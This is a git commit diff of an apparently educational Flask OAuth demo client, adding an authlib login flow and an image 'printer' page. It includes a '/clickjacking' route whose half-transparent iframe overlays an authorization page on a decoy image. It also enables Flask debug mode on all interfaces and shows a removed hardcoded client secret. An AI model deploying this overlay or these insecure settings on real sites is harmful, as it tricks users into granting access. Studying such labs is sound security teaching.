d8f55c4555281a164ae2416eda340d2ba8bdfd92
felpud0 <felipe.sanchezg@um.es>
2023-09-06 22:36:09 +0200

    demo client implemented

--- Dockerfile
+++ Dockerfile
@@ -5,4 +5,4 @@ WORKDIR /app
 COPY . .
 RUN pip install -r requirements.txt
 EXPOSE 5000
-CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]
+CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0", "--debug"]
--- demo_client/app.py
+++ demo_client/app.py
@@ -1,21 +1,23 @@
-from flask import Flask, request, url_for, render_template
+from flask import Flask, request, url_for, render_template, redirect, session
 import requests
 import base64
-
-IP="localhost"
-PORT=7777
-
-users = 0
-
+from authlib.integrations.flask_client import OAuth
+import time
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
+app.config.from_pyfile('defaultconf.cfg')
+def fetch_token(name):
+    return tokens[session['user']]
+oauth = OAuth(app,fetch_token=fetch_token)
+oauth.register(
+    name='toyas',
+    client_kwargs={
+        'scope': 'profile images'
+    },
+)
 
-# Fill this vars with the data from the registered client in the AS
-client_id = "98cf34e2301a9d77c3a3e46e62cea8b153743cca9a5d23d5"
-client_secret = "0fdd7d21633602389ec188da7bd75be6d855cd35bca8a7b8"
-redirect_uri = "http://localhost:7777/callback"
 
+tokens = {}
 
 @app.route('/')
 def index():
@@ -23,22 +25,42 @@ def index():
 
 @app.route('/connect')
 def connect():
-    pass
+    test = session.get('user')
+    tok = str(tokens)
+    if tokens.get(session.get('user')):
+        return redirect(url_for('printer'))
+    redirect_uri = url_for('callback', _external=True)
+    return oauth.toyas.authorize_redirect(redirect_uri)
+
+@app.route('/callback')
+def callback():
+
+    token = oauth.toyas.authorize_access_token()
+    user = oauth.toyas.get('http://toyas:5000/api/profile').json()
+    session['user'] = user['id']
+    tokens[user['id']] = token
+    return redirect(url_for('printer'))
+
+
+@app.route('/printer', methods=['GET', 'POST'])
+def printer():
+    if request.method == 'POST':
+        time.sleep(5)
+        return "Printed"
+
+    images = oauth.toyas.get('http://toyas:5000/api/images').json()
+    for image in images:
+        image['data'] = oauth.toyas.get('http://toyas:5000/api/images/'+str(image['id'])).text
+    
+    return render_template('printer.html', images=images)
+
 
 @app.route('/clickjacking')
 def iframe():
-    return '''
-    <iframe style="position: absolute; top: 0; left: 0;  z-index: 1; opacity: 0.5;"
-    src="http://localhost:5000/oauth/authorize?response_type=code&client_id=''' \
-    + client_id + '''&redirect_uri='''+redirect_uri+'''" width="400" height="400">
+    url = oauth.toyas.create_authorization_url(url_for('callback', _external=True))
+    return '<iframe style="position: absolute; top: 0; left: 0;  z-index: 1; opacity: 0.5;"' \
+    +'src="'+ url['url']+url['state']+'''" width="400" height="400">
     </iframe>
     <img style="position: absolute; top: 0; left: 0; z-index: -1;" 
     src=https://i.redd.it/esnsxmdd5le51.jpg width="400" height="400">
     '''
-
-@app.route('/callback')
-def callback():
-    code = request.args.get('code')
-    return "This is the authorization code: " + code
-
-
